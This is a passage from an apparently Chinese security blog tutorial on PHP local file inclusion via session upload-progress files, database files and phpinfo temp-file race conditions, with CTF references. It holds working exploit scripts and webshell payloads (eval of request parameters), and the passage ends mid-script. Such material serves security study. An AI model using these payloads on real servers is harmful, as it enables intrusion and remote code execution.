+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625662.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session">https://picture-1253331270.cos.ap-beijing.myqcloud.com/session</a> upload1.png)此处输入图片的描述</p>
+<p>ps: 这个说的好像有一点问题，应该是与 session.upload_progress.name 的值连接在一起的值</p>
+<p>那么这两个参数在 phpinfo(); 中的究竟是什么样子呢？因为后面已一直用到，所以我们先来看一下</p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625780.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session">https://picture-1253331270.cos.ap-beijing.myqcloud.com/session</a> 参数的值.png)</p>
+<h6 id="2-我们用实例代码解释一下上传进度"><a href="#2-我们用实例代码解释一下上传进度" class="headerlink" title="2.我们用实例代码解释一下上传进度"></a><strong>2.我们用实例代码解释一下上传进度</strong></h6><p><strong>POST 的表单</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+     <span class="token markup">&lt;input type="hidden" name=<span class="token prolog">&lt;?php echo ini_get('session.upload_progress.name');?></span></span> value<span class="token operator">=</span><span class="token string">"123"</span> <span class="token operator">/</span><span class="token operator">></span>
+     <span class="token markup">&lt;input type="file" name="file1" value = ""/></span>
+     <span class="token markup">&lt;input type="file" name="file2" value = ""/></span>
+     <span class="token markup">&lt;input type="submit" name = "submit" value = "upload"/></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们看到，这个 POST 表单通过 ini_get(“session.upload_progress.name”) 在 hidden POST 了一个和 php.ini 中 session.upload_progress.name 名字一样的数据，值为123</p>
+<p>如果我们能通过疯狂发包，使得这个 hidden 的 POST 数据能在文件传输没有完成的时候被服务器接收到，那么服务器就会在 session 临时文件中存储 这个文件的上传进度（当然是以序列化的形式显示的）</p>
+<p>为了能清楚地展示这个 session ，我假设我们的 upload.php 中存在下面的语句,$_SESSION 的值就能输出来 </p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">"session.upload_progress.prefix"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">"session.upload_progress.name"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+<span class="token keyword">echo</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>于是我们得到了类似这样的 <strong>$_SESSION 数据</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"upload_progress_123"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+ <span class="token string">"start_time"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1234567890</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">// The request time</span>
+ <span class="token string">"content_length"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">57343257</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// POST content length</span>
+ <span class="token string">"bytes_processed"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">453489</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// Amount of bytes received and processed</span>
+ <span class="token string">"done"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>              <span class="token comment" spellcheck="true">// true when the POST handler has finished, successfully or not</span>
+ <span class="token string">"files"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+  <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+   <span class="token string">"field_name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"file1"</span><span class="token punctuation">,</span>       <span class="token comment" spellcheck="true">// Name of the </span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">/></span></span></span> field
+   <span class="token comment" spellcheck="true">// The following 3 elements equals those in $_FILES</span>
+   <span class="token string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"foo.avi"</span><span class="token punctuation">,</span>
+   <span class="token string">"tmp_name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"/tmp/phpxxxxxx"</span><span class="token punctuation">,</span>
+   <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span>
+   <span class="token string">"done"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">// True when the POST handler has finished handling this file</span>
+   <span class="token string">"start_time"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1234567890</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// When this file has started to be processed</span>
+   <span class="token string">"bytes_processed"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">57343250</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// Amount of bytes received and processed for this file</span>
+  <span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token comment" spellcheck="true">// An other file, not finished uploading, in the same request</span>
+  <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+   <span class="token string">"field_name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"file2"</span><span class="token punctuation">,</span>
+   <span class="token string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"bar.avi"</span><span class="token punctuation">,</span>
+   <span class="token string">"tmp_name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>
+   <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span>
+   <span class="token string">"done"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+   <span class="token string">"start_time"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1234567899</span><span class="token punctuation">,</span>
+   <span class="token string">"bytes_processed"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">54554</span><span class="token punctuation">,</span>
+  <span class="token punctuation">)</span><span class="token punctuation">,</span>
+ <span class="token punctuation">)</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到我们的 123 赫然出现在 session 的数组中，那么如果我们 POST 的值不是 123 而是 <!--?php file_put_contents("xx","<?php eval(@$_POST['cmd']);?-->“)?&gt; 呢，是不是我们就能通过包含这个session 文件达到写shell 的目的了呢？</p>
+<p>但是还存在一个问题，当 session.upload_progress.cleanup为 On 的时候，$_SESSION 中的这个上传进度信息会在读取完全部的 POST 数据后立刻删除（删除的是 session 文件中的上传进度的部分内容，而不是session ），于是乎这个时候就需要条件竞争</p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625983.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session">https://picture-1253331270.cos.ap-beijing.myqcloud.com/session</a> enable.png)此处输入图片的描述</p>
+<p>我们从 PHPSESSID 中得到我们的 session 名以后，我们就一边疯狂请求 upload 页面 一边疯狂包含我们的 session 文件就好了</p>
+<p><strong>这里给出一个 可用的 POC</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment">#!coding:utf-8</span>
+
+import requests
+import time
+import threading
+
+host <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost'</span>
+<span class="token constant">PHPSESSID</span> <span class="token operator">=</span> <span class="token string">'vrhtvjd4j1sd88onr92fm9t2gt'</span>
+
+def <span class="token function">creatSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> True<span class="token punctuation">:</span>
+        files <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"submit"</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"tmp.gif"</span><span class="token punctuation">,</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"E:/fuck.gif"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="token punctuation">:</span> <span class="token string">"&lt;?php echo 'K0rz3n';file_put_contents('F:/muma.php','&lt;?php phpinfo();?>');?>"</span> <span class="token punctuation">}</span>
+        headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'PHPSESSID='</span> <span class="token operator">+</span> <span class="token constant">PHPSESSID</span><span class="token punctuation">}</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>host<span class="token operator">+</span><span class="token string">'/index.php'</span><span class="token punctuation">,</span>files <span class="token operator">=</span> files<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+
+
+fileName <span class="token operator">=</span> <span class="token string">"E:/phpstudy/PHPTutorial/tmp/tmp/sess_"</span><span class="token operator">+</span><span class="token constant">PHPSESSID</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+
+    url <span class="token operator">=</span> <span class="token string">"{}/qweasdzxc.php?rf={}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>fileName<span class="token punctuation">)</span>
+    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'PHPSESSID='</span> <span class="token operator">+</span> <span class="token constant">PHPSESSID</span><span class="token punctuation">}</span>
+    t <span class="token operator">=</span> threading<span class="token punctuation">.</span><span class="token function">Thread</span><span class="token punctuation">(</span>target<span class="token operator">=</span>creatSession<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    t<span class="token punctuation">.</span><span class="token function">setDaemon</span><span class="token punctuation">(</span>True<span class="token punctuation">)</span>
+    t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">while</span> True<span class="token punctuation">:</span>
+        res <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"K0rz3n"</span> in res<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+            <span class="token keyword">print</span> res<span class="token punctuation">.</span>content
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Get shell success."</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] retry."</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>对于这个 POC 我在本地也做了测试，下面是我的测试过程</p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625247.gif" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session">https://picture-1253331270.cos.ap-beijing.myqcloud.com/session</a> getshell.gif)此处输入图片的描述</p>
+<p>其中，我为了演示的效果还把 session 文件在那一瞬间的内容给大家显示出来了，就是下面这段内容</p>
+<pre class="line-numbers language-php"><code class="language-php">upload_progress_K0rz3n<span class="token operator">|</span>a<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"start_time"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1540314711</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"content_length"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">764161</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token string">"bytes_processed"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">5302</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"done"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"files"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"field_name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"submit"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"tmp.gif"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"tmp_name"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"error"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"done"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"start_time"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1540314711</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token string">"bytes_processed"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">5302</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>注意：这里有一个误区</strong></p>
+<p>发现，如果我们的 POST 请求中带着 session.upload_progress.name 的值，不管服务端PHP有没有<br>session_start() 的调用， 只要我们在请求头中填上 PHPSESSID(符合格式，随便你怎么写),服务器就会根据我们这个<br>PHPSESSID 在session 文件的默认存放位置生成一个 session 文件，这个方法也是 hitcon 2018 Orange 提醒我们的 </p>
+<h6 id="3-实际的案例"><a href="#3-实际的案例" class="headerlink" title="3.实际的案例"></a><strong>3.实际的案例</strong></h6><p><strong>1.N1CTF 2018 easy_php</strong></p>
+<p><a target="_blank" rel="noopener" href="http://skysec.top/2018/04/04/amazing-phpinfo/">http://skysec.top/2018/04/04/amazing-phpinfo/</a><br>这道题的复盘在<a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a></p>
+<p><strong>2.SCTF 2018 BabySyc - Simple PHP</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/051a87f45222?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=weixin">https://www.jianshu.com/p/051a87f45222?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=weixin</a></p>
+<p><strong>3.hitcon 2018 one line php challenge</strong></p>
+<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=718">http://wonderkun.cc/index.html/?p=718</a><br><a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge">https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge</a></p>
+<h4 id="3-数据库文件"><a href="#3-数据库文件" class="headerlink" title="3.数据库文件"></a><strong>3.数据库文件</strong></h4><p>我们知道，我们的数据库就是从纯文件的管理方式中进化而来，但是，计算机中存储的依然是文件，那么我们能不能在数据库中动动手脚，向数据库中的某个文件注入我们的恶意代码然后本地文件包含呢？当然可以，在 phpmyadmin 4.8.1 后台 getshell 中漏洞的发现者就是利用了这样一种技术成功包含了数据库的文件</p>
+<p>如果我们有创建表的权限，我们完全可以将表的某个字段写成一个一句话，然后我们找到这个表对应的文件包含之</p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625707.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%86%99">https://picture-1253331270.cos.ap-beijing.myqcloud.com/表字段写</a> shell.png)此处输入图片的描述</p>
+<p>我们知道数据库的一起都是以文件的形式存在的，我们来找一下这个文件</p>
+<p><strong>如图所示:</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99%E5%85%A5shell.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625902.png" alt="img"></a></p>
+<h4 id="4-临时文件"><a href="#4-临时文件" class="headerlink" title="4.临时文件"></a><strong>4.临时文件</strong></h4><p>向服务器上<strong>任意php文件</strong>以 <strong>form-data</strong> 方式提交请求上传数据时，会生成临时文件,通过<strong>phpinfo</strong>来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要条件竞争包含临时文件，然后如果临时文件的内容是一个向 web 目录写一句话，我们就能成功执行这段代码，并写 shell 到 web 目录最终拿到webshell(临时文件的文件名和位置需要在phpinfo 页面中查看)</p>
+<p>下图为 PHP 处理临时文件的整个过程：</p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625016.png" alt="img"></a></p>
+<p>比如说我 post 这样一个表单</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>  
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>  
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>  
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://localhost/testphpinfo/phpinfo.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>  
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>  
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>  
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>  
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>那么在 phpinfo 中就能发现下面的一项</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span>    
+<span class="token keyword">Array</span>
+<span class="token punctuation">(</span>
+    <span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> test<span class="token punctuation">.</span>txt
+    <span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> application<span class="token operator">/</span>octet<span class="token operator">-</span>stream
+    <span class="token punctuation">[</span>tmp_name<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> H<span class="token punctuation">:</span>\<span class="token package">wamp64<span class="token punctuation">\</span>tmp<span class="token punctuation">\</span>php1E81</span><span class="token punctuation">.</span>tmp
+    <span class="token punctuation">[</span>error<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span>
+    <span class="token punctuation">[</span>size<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">201</span>
+<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>下面引用 p总 在 vulhub 中的详细介绍：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/php/inclusion">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p>
+<p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。</p>
+<p>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。</p>
+<p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p>
+<p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
+<p>这个时候就需要用到条件竞争，具体流程如下：</p>
+<p>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据<br>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大<br>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接<br>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包<br>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除<br>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p>
+<p>下面是p 总的利用脚本，其中的有些地方我给出了简单的注释，方便大家理解</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python </span>
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> threading
+<span class="token keyword">import</span> socket
+
+<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>                                   <span class="token comment" spellcheck="true">#所有的请求的内容</span>
+    TAG<span class="token operator">=</span><span class="token string">"Security Test"</span>
+
+
+    PAYLOAD<span class="token operator">=</span><span class="token triple-quoted-string string">"""%s\r
+&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?>')?>\r"""</span> <span class="token operator">%</span> TAG
+
+
+    REQ1_DATA<span class="token operator">=</span><span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r"""</span> <span class="token operator">%</span> PAYLOAD
+
+    padding<span class="token operator">=</span><span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">5000</span>
+
+
+    REQ1<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST /phpinfo.php?a="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">""" HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\r
+HTTP_ACCEPT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
+HTTP_USER_AGENT: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\r
+HTTP_ACCEPT_LANGUAGE: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\r
+HTTP_PRAGMA: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s"""</span> <span class="token operator">%</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span>host<span class="token punctuation">,</span>REQ1_DATA<span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true">#modify this to suit the LFI script   </span>
